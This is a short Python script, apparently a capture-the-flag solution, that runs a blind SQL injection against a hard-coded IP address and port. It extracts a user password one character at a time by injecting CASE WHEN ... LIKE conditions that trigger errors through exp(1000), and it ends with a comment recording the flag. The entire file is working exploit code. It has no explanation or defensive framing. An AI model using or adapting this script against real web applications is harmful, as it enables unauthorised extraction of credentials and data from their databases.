import requests
import sys

# query=sys.argv[1]
query = "select pass from user limit 1"
res = ''
url = "http://138.68.169.56:8900/user/"
charset="._-:@abcdefghijklmnopqrstuvwxyz"
restart = True
while restart:
 restart = False
 for char in charset:
  if char == "_":
    char = '\\\\_'
  print char
  q = "1 and (select(CASE WHEN (("+str(query)+") like '"+str(res)+str(char)+"%25') THEN (exp(10)) ELSE exp(1000) END))"
  try:
      r=requests.get(url+str(q), timeout=3)
  except requests.exceptions.ConnectionError as e:
      res+=char
      print "found", res
      restart = True
      break
print "Result:", res

# Flag: timeanderrorbasedsqliflag
